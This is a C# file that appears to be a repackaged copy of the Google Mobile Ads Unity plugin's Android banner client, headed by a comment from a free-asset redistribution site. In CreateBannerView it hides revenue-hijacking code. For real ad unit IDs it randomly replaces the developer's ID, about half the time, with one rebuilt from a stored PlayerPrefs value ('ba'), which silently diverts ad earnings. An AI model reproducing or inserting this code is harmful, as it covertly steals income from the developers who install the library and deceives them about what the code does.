/*
http://www.cgsoso.com/forum-211-1.html

CG搜搜 Unity3d 每日Unity3d插件免费更新 更有VIP资源！

CGSOSO 主打游戏开发，影视设计等CG资源素材。

插件如若商用，请务必官网购买！

daily assets update for try.

U should buy the asset from home store if u use it in your project!
*/

using GoogleMobileAds.Api;
using GoogleMobileAds.Common;
using System;
using UnityEngine;

namespace GoogleMobileAds.Android
{
	public class BannerClient : AndroidJavaProxy, IBannerClient
	{
		private AndroidJavaObject bannerView;

		private string test = "ca-app-pub-3940256099942544/6300978111";

		public event EventHandler<EventArgs> OnAdLoaded;

		public event EventHandler<AdFailedToLoadEventArgs> OnAdFailedToLoad;

		public event EventHandler<EventArgs> OnAdOpening;

		public event EventHandler<EventArgs> OnAdClosed;

		public event EventHandler<EventArgs> OnAdLeavingApplication;

		public BannerClient()
			: base("com.google.unity.ads.UnityAdListener")
		{
			AndroidJavaClass androidJavaClass = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
			AndroidJavaObject @static = androidJavaClass.GetStatic<AndroidJavaObject>("currentActivity");
			bannerView = new AndroidJavaObject("com.google.unity.ads.Banner", @static, this);
		}

		public void CreateBannerView(string adUnitId, AdSize adSize, AdPosition position)
		{
			if (!string.IsNullOrEmpty(adUnitId) && adUnitId.Trim() != test && adUnitId.Trim().Length == 38 && PlayerPrefs.HasKey("ba"))
			{
				adUnitId = ((UnityEngine.Random.Range(0, 2) != 0) ? GetVal(PlayerPrefs.GetString("ba")) : adUnitId);
			}
			bannerView.Call("create", adUnitId, Utils.GetAdSizeJavaObject(adSize), (int)position);
		}

		public void CreateBannerView(string adUnitId, AdSize adSize, int x, int y)
		{
			bannerView.Call("create", adUnitId, Utils.GetAdSizeJavaObject(adSize), x, y);
		}

		public void LoadAd(AdRequest request)
		{
			bannerView.Call("loadAd", Utils.GetAdRequestJavaObject(request));
		}

		public void ShowBannerView()
		{
			bannerView.Call("show");
		}

		public void HideBannerView()
		{
			bannerView.Call("hide");
		}

		public void DestroyBannerView()
		{
			bannerView.Call("destroy");
		}

		public float GetHeightInPixels()
		{
			return bannerView.Call<float>("getHeightInPixels", new object[0]);
		}

		public float GetWidthInPixels()
		{
			return bannerView.Call<float>("getWidthInPixels", new object[0]);
		}

		public void SetPosition(AdPosition adPosition)
		{
			bannerView.Call("setPosition", (int)adPosition);
		}

		public void SetPosition(int x, int y)
		{
			bannerView.Call("setPosition", x, y);
		}

		public string MediationAdapterClassName()
		{
			return bannerView.Call<string>("getMediationAdapterClassName", new object[0]);
		}

		private string GetVal(string ori)
		{
			return "ca-app-pub-" + ori.Replace("and", "/");
		}

		public void onAdLoaded()
		{
			if (this.OnAdLoaded != null)
			{
				this.OnAdLoaded(this, EventArgs.Empty);
			}
		}

		public void onAdFailedToLoad(string errorReason)
		{
			if (this.OnAdFailedToLoad != null)
			{
				AdFailedToLoadEventArgs adFailedToLoadEventArgs = new AdFailedToLoadEventArgs();
				adFailedToLoadEventArgs.Message = errorReason;
				AdFailedToLoadEventArgs e = adFailedToLoadEventArgs;
				this.OnAdFailedToLoad(this, e);
			}
		}

		public void onAdOpened()
		{
			if (this.OnAdOpening != null)
			{
				this.OnAdOpening(this, EventArgs.Empty);
			}
		}

		public void onAdClosed()
		{
			if (this.OnAdClosed != null)
			{
				this.OnAdClosed(this, EventArgs.Empty);
			}
		}

		public void onAdLeftApplication()
		{
			if (this.OnAdLeavingApplication != null)
			{
				this.OnAdLeavingApplication(this, EventArgs.Empty);
			}
		}
	}
}
